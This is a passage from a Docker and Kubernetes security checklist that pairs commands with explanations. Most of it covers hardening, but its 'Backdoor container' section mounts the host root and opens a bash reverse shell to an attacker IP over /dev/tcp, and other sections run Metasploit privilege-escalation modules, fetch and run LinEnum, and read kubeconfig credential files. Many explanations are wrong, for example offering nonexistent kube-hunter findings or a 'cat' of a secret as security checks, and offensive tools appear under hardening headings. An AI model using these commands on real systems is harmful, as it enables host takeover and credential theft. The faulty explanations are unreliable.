docker info --format '{{.SecurityOptions}}'
```

Explanation: The command uses the Docker CLI to retrieve information about the Docker daemon. The `--format` flag specifies the output format, and in this case, `{{.SecurityOptions}}` is used to display the security options configured for the Docker daemon. If the output includes `no-new-privileges`, it indicates that communication with the Docker daemon is restricted to the local socket.


3. Using kubectl and grep:

```
kubectl get podsecuritypolicies.policy --all-namespaces -o json | grep -i "localhost"
```


Explanation: The command uses kubectl to retrieve information about PodSecurityPolicies in all namespaces in JSON format. The output is piped to grep to search for lines containing "localhost". If any matching lines are found, it indicates that communication with the Docker daemon is restricted to the local socket based on the defined PodSecurityPolicies.


### Enable Docker Swarm Mode


1. Using Docker CLI:

```
docker info --format '{{.Swarm.LocalNodeState}}'
```

Explanation: The command uses the Docker CLI to retrieve information about the Docker Swarm mode. The `--format` flag specifies the output format, and in this case, `{{.Swarm.LocalNodeState}}` is used to display the local node state of the Docker Swarm. If the output is "active", it indicates that Docker Swarm mode is enabled.


2. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Docker Swarm Mode"
```

Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Docker Swarm Mode" findings. This identifies if Docker Swarm mode is enabled within the cluster.


3. Using Docker CLI and awk:

```
docker node ls --format '{{.Self}}' | awk '{print $1}'
```


Explanation: The command uses the Docker CLI to list the nodes in the Docker Swarm. The `--format` flag specifies the output format, and in this case, `{{.Self}}` is used to display the ID of the current node. If the output displays a node ID, it indicates that Docker Swarm mode is enabled.


### Set up network security for Docker Swarm

1. Using Docker CLI and grep:

```
docker network inspect <network-name> | grep "ingress"
```

Explanation: The command uses the Docker CLI to inspect the specified Docker network `<network-name>`. The output is piped to grep to search for lines containing "ingress". If any matching lines are found, it indicates that network security has been set up for Docker Swarm ingress.


2. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Docker Swarm Network Security"
```


Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Docker Swarm Network Security" findings. This identifies if network security has been set up for Docker Swarm within the cluster.


3. Using Docker CLI and awk:

```
docker swarm inspect --format '{{.EncryptionConfig.AutoLockManagers}}' | awk '{print $1}'
```

Explanation: The command uses the Docker CLI to inspect the Docker Swarm. The `--format` flag specifies the output format, and in this case, `{{.EncryptionConfig.AutoLockManagers}}` is used to display the status of auto-lock managers for encryption. If the output displays a value, it indicates that network security measures, such as encryption, have been set up for Docker Swarm.




### Implement resource constraints on Docker containers


1. Using Docker CLI:

```
docker inspect <container-id> --format '{{.HostConfig.Resources}}'
```

Explanation: The command uses the Docker CLI to inspect the specified Docker container `<container-id>`. The `--format` flag specifies the output format, and in this case, `{{.HostConfig.Resources}}` is used to display the resource constraints defined for the container. If the output displays resource constraints such as CPU and memory limits, it indicates that resource constraints are implemented.


2. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Container Resource Constraints"
```

Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Container Resource Constraints" findings. This identifies if resource constraints are implemented within the cluster.

3. Using Docker CLI and awk:

```
docker stats --no-stream --format "table {{.Name}}\t{{.CPUPerc}}\t{{.MemUsage}}"
```

Explanation: The command uses the Docker CLI to display the resource usage statistics of running containers. The `--no-stream` flag prevents continuous streaming of statistics, and the `--format` flag specifies the output format. The command uses the `table` format to display the container name, CPU percentage, and memory usage. This allows you to view the resource utilization of containers and verify if resource constraints are implemented.


### Use Docker Secrets to protect sensitive data


1. Using Docker CLI:

```
docker secret ls --format '{{.Name}}'
```


Explanation: The command uses the Docker CLI to list the Docker secrets. The `--format` flag specifies the output format, and in this case, `{{.Name}}` is used to display the names of the Docker secrets. If any secrets are listed, it indicates that Docker Secrets are being used to protect sensitive data.


2. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Docker Secrets"
```

Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Docker Secrets" findings. This identifies if Docker Secrets are being used to protect sensitive data within the cluster.

3. Using Docker CLI and awk:

```
docker exec <container-id> cat /run/secrets/<secret-name>
```

Explanation: The command uses the Docker CLI to execute a command inside the specified Docker container `<container-id>`. The `cat /run/secrets/<secret-name>` command reads the contents of the Docker secret specified by `<secret-name>`. If the secret's content is displayed, it indicates that Docker Secrets are being used to protect sensitive data within the container.



### Limit access to Docker APIs

1. Using Docker CLI:

```
docker system info --format '{{.Swarm.RemoteManagers}}'
```

Explanation: The command uses the Docker CLI to retrieve information about the Docker system. The `--format` flag specifies the output format, and in this case, `{{.Swarm.RemoteManagers}}` is used to display the list of remote Docker managers. If the output displays any remote managers, it indicates that access to Docker APIs may not be limited.


2. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Docker API Access Control"
```

Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Docker API Access Control" findings. This identifies if access to Docker APIs is limited within the cluster.


3. Using Docker CLI and netstat:

```
docker ps -q | xargs -I {} docker exec {} sh -c "netstat -lntp | grep dockerd"
```

Explanation: The command uses the Docker CLI to list the running Docker containers. The output is then piped to xargs to execute a command on each container. The `docker exec {} sh -c "netstat -lntp | grep dockerd"` command is executed in each container to check if the Docker daemon (dockerd) is listening on any network interfaces. If any output is displayed, it indicates that access to Docker APIs may not be limited.





### Rotate Docker TLS certificates regularly


1. Using Docker CLI:

```
docker info --format '{{.Swarm.CACertExpiresAt}}'
```

Explanation: The command uses the Docker CLI to retrieve information about the Docker swarm. The `--format` flag specifies the output format, and in this case, `{{.Swarm.CACertExpiresAt}}` is used to display the expiration date of the Docker CA certificate. If the output displays a future expiration date, it indicates that Docker TLS certificates are being rotated regularly.


2. Using kube-hunter and grep:

```
kube-hunter --remote <cluster-IP> -f json | grep -A 5 "Docker TLS Certificate Rotation"
```


Explanation: The command uses kube-hunter to perform a security assessment on a remote Kubernetes cluster specified by `<cluster-IP>`. It generates the output in JSON format. The output is then piped to grep to filter the results for "Docker TLS Certificate Rotation" findings. This identifies if Docker TLS certificates are being regularly rotated within the cluster.


3. Using Docker CLI and awk:

```
docker inspect --format='{{.ID}}' $(docker service ls -q) | xargs -I {} docker inspect --format='{{range .TLSInfo.Certificates}}{{.Expiry}}{{end}}' {}
```


Explanation: The command uses the Docker CLI to list the services in the Docker swarm. The output is piped to xargs to execute a command on each service. The `docker inspect --format='{{range .TLSInfo.Certificates}}{{.Expiry}}{{end}}' {}` command is executed to retrieve the expiration date of the TLS certificates used by each service. If any expiration dates are displayed, it indicates that Docker TLS certificates are being regularly rotated.




### Use non-root user

1. Example Command: Using Docker and Nmap

```
docker run -it --rm --cap-drop=ALL --cap-add=SETUID --cap-add=SETGID --cap-add=CHOWN --cap-add=DAC_OVERRIDE --cap-add=FOWNER --cap-add=SYS_ADMIN --cap-add=DAC_READ_SEARCH --cap-add=LINUX_IMMUTABLE --cap-add=NET_BIND_SERVICE --user 1000:1000 nmap -p 80,443 target_ip
```

Explanation: This command uses Docker to run the Nmap container with restricted capabilities. The `--user 1000:1000` flag sets the non-root user inside the container, allowing you to scan ports 80 and 443 on the target IP.


2. Example Command: Using Kali Linux and LinEnum.sh

```
docker run -it --rm -v "$(pwd)":/host kali-linux-everything bash -c "cd /host && wget -q https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh -e /bin/bash"
```

Explanation: This command runs the Kali Linux container and mounts the current directory to the container's file system. It then downloads LinEnum.sh, a script for Linux privilege escalation checks, and executes it as a non-root user within the container.


3. Example Command: Using Metasploit Framework and Docker

```
docker run -it --rm -v "$(pwd)":/host metasploit-framework bash -c "msfconsole -qx 'setg DisablePayloadHandler true; use exploit/linux/local/bpf_sign_extension_priv_esc; set RHOST target_ip; set SESSION 1; run; exit'"
```


Explanation: This command utilizes Docker to run the Metasploit Framework container and mounts the current directory to the container's file system. It then launches the Metasploit console, sets the target IP and session, and executes an exploit module for Linux privilege escalation. The `setg DisablePayloadHandler true` command ensures that the payload handler is disabled, allowing the exploit to run without waiting for a reverse shell connection.


### Limit container capabilities


1. Example Command: Using Docker and Capsh

```
docker run -it --rm --cap-drop=ALL --security-opt no-new-privileges alpine capsh --inh=cap_net_raw+ep --drop=cap_sys_admin -- -c 'ping -c 1 target_ip'
```


Explanation: This command runs an Alpine Linux container with all capabilities dropped (`--cap-drop=ALL`) and no new privileges (`--security-opt no-new-privileges`). It then uses the Capsh tool to inherit the `cap_net_raw` capability with effective privileges (`+ep`) while dropping the `cap_sys_admin` capability. Finally, it executes the `ping` command as a non-root user inside the container to ping the target IP.


2. Example Command: Using Podman and RunC

```
podman run --rm -it --cap-drop=all --cap-add=audit_control --cap-add=setuid --security-opt=no-new-privileges --runtime=runc docker.io/library/ubuntu /bin/bash -c 'whoami'
```


Explanation: This command uses Podman to run an Ubuntu container with all capabilities dropped (`--cap-drop=all`) except for `audit_control` and `setuid` which are explicitly added (`--cap-add=audit_control --cap-add=setuid`). It also enforces no new privileges (`--security-opt=no-new-privileges`) and specifies the runtime as RunC (`--runtime=runc`). Finally, it executes the `whoami` command inside the container to check the current user.


3. Example Command: Using Kata Containers and Docker Image

```
kata-runtime run --rm --cap-drop=ALL --cap-add=chown --cap-add=dac_override --cap-add=fowner --cap-add=setgid --cap-add=setuid --cap-add=sys_admin --cap-add=net_bind_service docker.io/library/debian /bin/bash -c 'ls /'
```


Explanation: This command uses the Kata Containers runtime (`kata-runtime`) to run a Debian container with all capabilities dropped (`--cap-drop=ALL`) except for specific capabilities added (`--cap-add=chown --cap-add=dac_override --cap-add=fowner --cap-add=setgid --cap-add=setuid --cap-add=sys_admin --cap-add=net_bind_service`). It then executes the `ls /` command inside the container to list the root directory.




### Restrict container resources


1. Example Command: Using Docker and Cgroups

```
docker run -it --rm --cpus=".5" --memory="256m" --blkio-weight=500 --network none alpine sh -c "stress --cpu 1 --io 1 --vm 1 --vm-bytes 128M --timeout 10s"
```

Explanation: This command runs an Alpine Linux container with restricted resources. The `--cpus=".5"` flag limits the container to use only 0.5 CPU core, `--memory="256m"` sets the memory limit to 256MB, `--blkio-weight=500` sets the block I/O weight to 500, and `--network none` disables network access for the container. Inside the container, the `stress` command is executed to simulate resource-intensive operations.


2. Example Command: Using Kubernetes and Resource Quotas

```
kubectl run --generator=run-pod/v1 --restart=Never --limits="cpu=500m,memory=512Mi" --requests="cpu=200m,memory=256Mi" --image=nginx my-pod -- sh -c "stress --cpu 1 --io 1 --vm 1 --vm-bytes 128M --timeout 10s"
```

Explanation: This command creates a Kubernetes Pod with resource quotas. The `--limits` flag specifies the maximum resource limits for the Pod, while the `--requests` flag sets the minimum resource requirements. In this example, the CPU limit is set to 500 milliCPU (0.5 CPU) and the memory limit is set to 512MiB. The CPU request is 200 milliCPU and the memory request is 256MiB. The Pod runs the nginx image and inside it, the `stress` command is executed to generate resource load.


3. Example Command: Using Docker Compose and Compose file

```
docker-compose up -d
```


Compose file:


```
version: '3'
services:
  web:
    image: nginx
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 256M
        reservations:
          cpus: '0.2'
          memory: 128M
```


Explanation: This command uses Docker Compose to deploy a service with resource restrictions. The Compose file defines a service named "web" with an nginx image. The `limits` section specifies the maximum resource limits for the service, while the `reservations` section sets the minimum resource requirements. In this example, the CPU limit is set to 0.5 CPU and the memory limit is set to 256MB. The CPU reservation is 0.2 CPU and the memory reservation is 128MB. The service is started in detached mode (`-d` flag) to run in the background.



### Enable read-only file system


1. Example Command: Using Docker and BusyBox

```
docker run -it --rm --read-only busybox sh
```


Explanation: This command runs a BusyBox container with a read-only file system. The `--read-only` flag ensures that the container's file system is mounted as read-only. Inside the container, the `sh` command starts an interactive shell.


2. Example Command: Using Kubernetes and Pod Security Policies

```
kubectl run --generator=run-pod/v1 --restart=Never --image=nginx my-pod --overrides='{"apiVersion": "v1", "spec": {"securityContext": {"readOnlyRootFilesystem": true}}}' -- sleep infinity
```

Explanation: This command creates a Kubernetes Pod with a read-only root file system. The `--overrides` flag allows overriding the Pod's configuration, and in this case, it sets the `readOnlyRootFilesystem` field to `true` in the Pod's `securityContext`. The Pod runs the nginx image, and the `sleep infinity` command keeps the Pod running indefinitely.


3. Example Command: Using Docker and Mount Options

```
docker run -it --rm --mount type=tmpfs,dst=/app,tmpfs-mode=1777,tmpfs-size=10M --mount type=bind,src=$(pwd),dst=/data,readonly alpine sh
```


Explanation: This command runs an Alpine Linux container with a read-only file system mounted using mount options. The `--mount` flag is used twice: the first `--mount` option mounts a temporary file system (`tmpfs`) with the `/app` destination as read-only. The `tmpfs-mode=1777` sets the permission of the temporary file system, and `tmpfs-size=10M` specifies the size limit. The second `--mount` option binds the current directory (`$(pwd)`) to the `/data` destination as read-only. Inside the container, the `sh` command starts an interactive shell.


### Set container restart policy


1. Example Command: Using Docker and Restart Policies

```
docker run -it --rm --restart=on-failure:5 al
```

Explanation: This command runs an Alpine Linux container with a restart policy set to `on-failure:5`. This means that the container will automatically restart if it fails, up to a maximum of 5 attempts. Inside the container, the `sh` command starts an interactive shell.


2. Example Command: Using Kubernetes and Restart Policy

```
kubectl run --generator=run-pod/v1 --restart=OnFailure --image=nginx my-pod -- sleep infinity
```


Explanation: This command creates a Kubernetes Pod with a restart policy set to `OnFailure`. This ensures that the Pod will automatically restart if it fails. The Pod runs the nginx image, and the `sleep infinity` command keeps the Pod running indefinitely.


3. Example Command: Using Docker Compose and Restart Policy

```
docker-compose up -d
```


Compose file:


```
version: '3'
services:
  web:
    image: nginx
    restart: always
```

Explanation: This command uses Docker Compose to deploy a service with a restart policy. The Compose file defines a service named "web" with the nginx image and sets the restart policy to `always`. This means that the container will be automatically restarted regardless of the exit status. The service is started in detached mode (`-d` flag) to run in the background.


### Use TLS/SSL for secure communication


1. Example Command: Using Docker and Nginx with a Self-Signed Certificate

```
docker run -it --rm -p 443:443 -v $(pwd)/certs:/etc/nginx/certs nginx:alpine sh -c "openssl req -x509 -nodes -newkey rsa:2048 -keyout /etc/nginx/certs/key.pem -out /etc/nginx/certs/cert.pem -days 365 -subj '/CN=localhost' && nginx"
```

Explanation: This command runs an Nginx container with Alpine Linux and generates a self-signed SSL certificate using OpenSSL. The `-p 443:443` flag exposes port 443 for secure HTTPS communication. The `-v $(pwd)/certs:/etc/nginx/certs` flag mounts a directory containing the certificate files inside the container. The `openssl req` command generates the self-signed certificate, and then Nginx is started within the container.


2. Example Command: Using Docker and Caddy Server with Automatic SSL

```
docker run -it --rm -p 443:443 -v $(pwd)/Caddyfile:/etc/caddy/Caddyfile caddy:alpine
```


Caddyfile:


```
example.com {
  tls internal
  proxy / http://target_ip
}
```

Explanation: This command runs a Caddy Server container with Alpine Linux, which automatically handles SSL certificate generation and renewal using Let's Encrypt. The `-p 443:443` flag exposes port 443 for secure communication. The `-v $(pwd)/Caddyfile:/etc/caddy/Caddyfile` flag mounts a Caddyfile configuration file inside the container. The provided Caddyfile configures Caddy to enable TLS for the specified domain (`example.com`) and proxies traffic to the target IP.


3. Example Command: Using Kubernetes and Nginx Ingress Controller with TLS

```
kubectl apply -f nginx-ingress.yaml
```

nginx-ingress.yaml:


```
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: my-ingress
  annotations:
    kubernetes.io/ingress.class: "nginx"
    cert-manager.io/cluster-issuer: "letsencrypt-prod"
spec:
  tls:
  - hosts:
    - example.com
    secretName: my-tls-secret
  rules:
  - host: example.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: my-service
            port:
              number: 80
```


Explanation: This command deploys an Ingress resource in Kubernetes, using the Nginx Ingress Controller. The Ingress resource specifies TLS configuration for the domain `example.com`. It also references a secret named `my-tls-secret`, which contains the TLS certificate and private key. The Nginx Ingress Controller handles SSL termination and secure communication for the specified domain.


### Enable authentication


1. Example Command: Using Docker and Apache with Basic Authentication

```
docker run -it --rm -p 80:80 -e "AUTH_USERNAME=admin" -e "AUTH_PASSWORD=password" httpd:alpine htpasswd -b -c /usr/local/apache2/conf/.htpasswd $AUTH_USERNAME $AUTH_PASSWORD && httpd-foreground
```

Explanation: This command runs an Apache container with Alpine Linux and enables basic authentication. The `-p 80:80` flag exposes port 80 for HTTP communication. The `-e "AUTH_USERNAME=admin" -e "AUTH_PASSWORD=password"` flags pass environment variables for the desired username and password. The `htpasswd` command creates the `.htpasswd` file with the provided credentials. Finally, the `httpd-foreground` command starts the Apache server.


2. Example Command: Using Kubernetes and Nginx Ingress Controller with OAuth2 Proxy

```
kubectl apply -f oauth2-proxy.yaml
```

oauth2-proxy.yaml:


```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: oauth2-proxy
spec:
  replicas: 1
  selector:
    matchLabels:
      app: oauth2-proxy
  template:
    metadata:
      labels:
        app: oauth2-proxy
    spec:
      containers:
      - name: oauth2-proxy
        image: quay.io/oauth2-proxy/oauth2-proxy:v7.1.3
        args:
        - --http-address=http://0.0.0.0:4180
        - --upstream=http://backend-service
        - --email-domain=example.com
        - --cookie-secret=secretvalue
        - --provider=google
        - --client-id=YOUR_CLIENT_ID
        - --client-secret=YOUR_CLIENT_SECRET
---
apiVersion: v1
kind: Service
metadata:
  name: oauth2-proxy
spec:
  selector:
    app: oauth2-proxy
  ports:
  - protocol: TCP
    port: 80
    targetPort: 4180
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: oauth2-proxy-ingress
  annotations:
    kubernetes.io/ingress.class: "nginx"
spec:
  rules:
  - host: example.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: oauth2-proxy
            port:
              number: 80
```


Explanation: This command deploys OAuth2 Proxy, an authentication proxy, in Kubernetes along with Nginx Ingress Controller. The OAuth2 Proxy container acts as an authentication layer in front of the backend service. The configuration in `oauth2-proxy.yaml` includes the necessary arguments and environment variables to set up authentication with a Google provider. The Ingress resource defines the routing rules and specifies the hostname where authentication will be enforced.


3. Example Command: Using Docker and Traefik with Basic Authentication Middleware

```
docker run -it --rm -p 80:80 -p 8080:8080 -e "TRAEFIK_API_AUTH_BASIC=admin:password" traefik:v2.4 --api.insecure=true --providers.docker
```

Explanation: This command runs Traefik, a popular reverse proxy and load balancer, with basic authentication middleware enabled. The `-p 80:80` flag exposes port 80 for HTTP communication, while the `-p 8080:8080` flag exposes the Traefik dashboard. The `-e "TRAEFIK_API_AUTH_BASIC=admin:password"` flag sets the basic authentication credentials for accessing the Traefik API and dashboard. The `--api.insecure=true` flag allows HTTP access to the API for simplicity in this example, but in a production setup, HTTPS should be used.




### Limit access to trusted clients

1. Example Command: Using Docker and Nginx with IP Whitelisting

```
docker run -it --rm -p 80:80 -v $(pwd)/nginx.conf:/etc/nginx/nginx.conf nginx:alpine
```

nginx.conf:


```
events { }

http {
    server {
        listen 80;
        allow 192.168.0.0/16; # Allowed IP range
        deny all;
        location / {
            return 200 'Access granted only to trusted clients.';
        }
    }
}
```

Explanation: This command runs an Nginx container with Alpine Linux and IP whitelisting configuration. The `-p 80:80` flag exposes port 80 for HTTP communication. The `-v $(pwd)/nginx.conf:/etc/nginx/nginx.conf` flag mounts a custom Nginx configuration file inside the container. The provided `nginx.conf` file allows access only from the specified IP range (in this case, `192.168.0.0/16`), denying all other IP addresses. Any requests to the server will receive a response stating that access is granted only to trusted clients.


2. Example Command: Using Kubernetes and Network Policies

```
kubectl apply -f network-policy.yaml
```

network-policy.yaml:


```
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-trusted-clients
spec:
  podSelector: {}
  ingress:
  - from:
    - ipBlock:
        cidr: 192.168.0.0/16 # Allowed IP range
```


Explanation: This command applies a Kubernetes NetworkPolicy that allows access only from the specified IP range. The NetworkPolicy named `allow-trusted-clients` has an `ingress` rule that permits traffic from the defined `cidr` (in this case, `192.168.0.0/16`). The `podSelector: {}` field ensures that the policy applies to all pods in the namespace.

3. Example Command: Using Docker and Caddy Server with IP Whitelisting Middleware

```
docker run -it --rm -p 80:80 -v $(pwd)/Caddyfile:/etc/caddy/Caddyfile caddy:alpine
```


Caddyfile:


```
example.com {
    ipfilter / {
        rule allow
        ip 192.168.0.0/16 # Allowed IP range
    }
    respond "Access granted only to trusted clients."
}
```

Explanation: This command runs a Caddy Server container with Alpine Linux and IP whitelisting middleware. The `-p 80:80` flag exposes port 80 for HTTP communication. The `-v $(pwd)/Caddyfile:/etc/caddy/Caddyfile` flag mounts a custom Caddyfile configuration inside the container. The provided Caddyfile configures IP filtering middleware to allow access only from the specified IP range (in this case, `192.168.0.0/16`). Any requests to the server will receive a response stating that access is granted only to trusted clients.



### Implement access control policies


1. Example Command: Using Docker and Nginx with Basic Authentication

```
docker run -it --rm -p 80:80 -v $(pwd)/htpasswd:/etc/nginx/.htpasswd nginx:alpine
```


Explanation: This command runs an Nginx container with Alpine Linux and implements basic authentication using an `.htpasswd` file. The `-p 80:80` flag exposes port 80 for HTTP communication. The `-v $(pwd)/htpasswd:/etc/nginx/.htpasswd` flag mounts a custom `.htpasswd` file inside the container, which contains the username and hashed password. Nginx will authenticate requests based on the credentials in the `.htpasswd` file.


2. Example Command: Using Kubernetes and RBAC (Role-Based Access Control)

```
kubectl apply -f rbac.yaml
```


rbac.yaml:


```
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: limited-role
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["get", "list"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: limited-role-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: limited-role
subjects:
- kind: User
  name: alice # User name
```

Explanation: This command applies Kubernetes RBAC (Role-Based Access Control) configurations. The `rbac.yaml` file defines a `Role` named `limited-role` that grants read access (`get`, `list`) to `pods` resources. It also creates a `RoleBinding` named `limited-role-binding` that assigns the `limited-role` to the user `alice`. Adjust the `Role` and `RoleBinding` as needed to match your specific access control requirements.

3. Example Command: Using Docker and Open Policy Agent (OPA)

```
docker run -it --rm -v $(pwd)/policy:/policy -p 8080:8080 openpolicyagent/opa eval --format pretty --data /policy --input '{"user": "alice", "resource": "secret"}' --unknowns=ignore "data.authz.allow"
```


Explanation: This command runs Open Policy Agent (OPA) in a Docker container. The `-v $(pwd)/policy:/policy` flag mounts a directory containing the policy files. The `-p 8080:8080` flag exposes port 8080 for OPA's API. The `eval` command evaluates the policy defined in `/policy` using the input provided (`{"user": "alice", "resource": "secret"}`). It checks if the user `alice` is allowed access to the `secret` resource based on the policy defined in OPA.


### Enable content trust (image signing)


1. Example Command: Using Docker and Docker Content Trust

```
export DOCKER_CONTENT_TRUST=1
docker run -it --rm alpine sh
```

Explanation: This command enables Docker Content Trust, which ensures the authenticity and integrity of container images. The `export DOCKER_CONTENT_TRUST=1` command sets the environment variable to enable content trust. Then, the `docker run` command starts an Alpine Linux container with the trust-enabled configuration. You can replace `alpine` with any desired image.


2. Example Command: Using Docker and Notary

```
export DOCKER_CONTENT_TRUST_SERVER=https://notary-server.example.com
docker run -it --rm --security-opt=no-new-privileges alpine sh
```


Explanation: This command configures Docker to use a specific Notary server for content trust. The `export DOCKER_CONTENT_TRUST_SERVER=https://notary-server.example.com` command sets the environment variable to specify the Notary server's URL. The `--security-opt=no-new-privileges` flag adds an extra security measure by disallowing new privileges within the container. Finally, the `docker run` command starts an Alpine Linux container with the trust-enabled configuration.


3. Example Command: Using Docker and Docker Compose with Docker Content Trust

```
export DOCKER_CONTENT_TRUST=1
docker-compose up -d
```

docker-compose.yml:


```
version: '3'
services:
  web:
    image: nginx
```


Explanation: This command enables Docker Content Trust and uses Docker Compose to start a service with image signing enabled. The `export DOCKER_CONTENT_TRUST=1` command sets the environment variable to enable content trust. The `docker-compose up -d` command starts the service defined in the `docker-compose.yml` file, which uses the Nginx image in this example. Docker Content Trust will be applied to ensure the authenticity and integrity of the image used.




### Bash or cmd inside container

1. Example Command: Using Docker and Bash

```
docker run -it --rm alpine /bin/sh
```

Explanation: This command runs an Alpine Linux container and starts an interactive shell using `/bin/sh`. The `-it` flags allocate a pseudo-TTY and enable interactive mode. You can execute various commands and interact with the container's shell.


2. Example Command: Using Kubernetes and Pod with Bash

```
kubectl run --generator=run-pod/v1 --restart=Never --image=alpine my-pod -- /bin/sh -c "while true; do echo 'Hello, World!'; sleep 1; done"
```


Explanation: This command creates a Kubernetes Pod with the Alpine Linux image and runs the specified command `/bin/sh -c "while true; do echo 'Hello, World!'; sleep 1; done"`. The Pod runs the command in an infinite loop, printing "Hello, World!" every second. You can replace the provided command with any desired commands to execute inside the Pod's shell.

3. Example Command: Using Docker and Command Prompt (cmd)

```
docker run -it --rm mcr.microsoft.com/windows/nanoserver cmd
```


Explanation: This command runs a Windows Nano Server container and starts an interactive shell using `cmd`. The `-it` flags allocate a pseudo-TTY and enable interactive mode. This allows you to execute Windows-specific commands and interact with the container's command prompt.


### Kubeconfig file

1. Example Command: Using Docker and Grep

```
docker run -it --rm -v $HOME/.kube:/kube busybox sh -c "grep -r 'kubeconfig' /kube"
```

Explanation: This command mounts the `$HOME/.kube` directory from the host into the BusyBox container. The `grep` command is then executed to search for the string 'kubeconfig' recursively within the `/kube` directory, which contains the Kubernetes configuration files. This allows you to identify the location and contents of the Kubeconfig file.


2. Example Command: Using Kubernetes and Pod with Cat

```
kubectl run --generator=run-pod/v1 --restart=Never --image=alpine my-pod -- cat /root/.kube/config
```


Explanation: This command creates a Kubernetes Pod with the Alpine Linux image and runs the `cat` command to display the contents of the Kubeconfig file located at `/root/.kube/config`. The Kubeconfig file is printed to the console output of the Pod, allowing you to retrieve the contents.


3. Example Command: Using Docker and Find

```
docker run -it --rm -v $HOME:/host alpine find /host -name 'kubeconfig*'
```


Explanation: This command mounts the `$HOME` directory from the host into the Alpine Linux container. The `find` command is then executed to search for files with names matching 'kubeconfig' within the `/host` directory (which corresponds to the host's `$HOME`). This command helps identify the location and path of any Kubeconfig files found on the host system.



### Sidecar injection

1. Example Command: Using Kubernetes and Istio Sidecar Injector

```
kubectl apply -f deployment.yaml | kubectl -n istio-system wait --for=condition=ready pod --timeout=60s -l istio=sidecar-injector
```

deployment.yaml:

```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-deployment
spec:
  replicas: 1
  selector:
    matchLabels:
      app: my-app
  template:
    metadata:
      labels:
        app: my-app
      annotations:
        sidecar.istio.io/inject: "true"
    spec:
      containers:
      - name: my-app
        image: my-app-image:latest
```


Explanation: This command applies a Kubernetes deployment manifest (`deployment.yaml`) that deploys an application. The deployment template includes the `sidecar.istio.io/inject: "true"` annotation, enabling sidecar injection using Istio. The `kubectl apply` command applies the deployment manifest, and the subsequent `kubectl wait` command waits for the sidecar-injected pod to be ready within the `istio-system` namespace.


2. Example Command: Using Docker and Envoy Proxy

```
docker run -d -p 8080:8080 --name my-container envoyproxy/envoy:v1.19.0
```


Explanation: This command runs an Envoy Proxy container (`envoyproxy/envoy:v1.19.0`) in the background with port forwarding from host port 8080 to container port 8080. Envoy Proxy can be used as a sidecar proxy to intercept and manipulate network traffic between services running in containers.


3. Example Command: Using Kubernetes and Linkerd Sidecar Injector

```
kubectl apply -f deployment.yaml | kubectl -n linkerd wait --for=condition=ready pod --timeout=60s -l linkerd.io/inject=enabled
```


deployment.yaml:


```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-deployment
spec:
  replicas: 1
  selector:
    matchLabels:
      app: my-app
  template:
    metadata:
      labels:
        app: my-app
      annotations:
        linkerd.io/inject: "enabled"
    spec:
      containers:
      - name: my-app
        image: my-app-image:latest
```

Explanation: This command applies a Kubernetes deployment manifest (`deployment.yaml`) that deploys an application. The deployment template includes the `linkerd.io/inject: "enabled"` annotation, enabling sidecar injection using Linkerd. The `kubectl apply` command applies the deployment manifest, and the subsequent `kubectl wait` command waits for the sidecar-injected pod to be ready within the `linkerd` namespace.




### Backdoor container



1. Using Nmap and Metasploit:

```
nmap -p <container_port> <container_ip> && msfconsole -x "use exploit/<exploit_module>; set RHOST <container_ip>; set RPORT <container_port>; set PAYLOAD <payload>; run"
```



Explanation:

- Replace `<container_port>` with the specific port number of the container you want to target.
- Replace `<container_ip>` with the IP address of the container.
- `<exploit_module>` refers to the specific Metasploit exploit module you want to use.
- `<payload>` represents the payload you want to use for gaining back access to the container.

2. Using Docker and Reverse Shell:

```
docker run -v /:/hostroot -it <container_image> /bin/bash -c 'chroot /hostroot; bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1'
```

Explanation:

- Replace `<container_image>` with the name of the container image you want to exploit.
- `<attacker_ip>` should be replaced with the IP address of the machine where the attacker has their listener.
- `<attacker_port>` should be replaced with the port number where the attacker is listening for incoming connections.


3. Using OWASP ZAP and XSS Attack:

```
zap-cli quick-scan --spider <container_url> && zap-cli active-scan --recursive --scanners xss <container_url>
```

Explanation:

- Install OWASP ZAP (Zed Attack Proxy) and ensure the `zap-cli` command-line tool is available.
- Replace `<container_url>` with the URL of the container you want to test for cross-site scripting (XSS) vulnerabilities.
- The command will perform a quick scan and spider the target URL, followed by an active scan with the XSS scanner enabled.


### Cluster-admin binding

```
kubectl get clusterrolebindings | grep cluster-admin
```

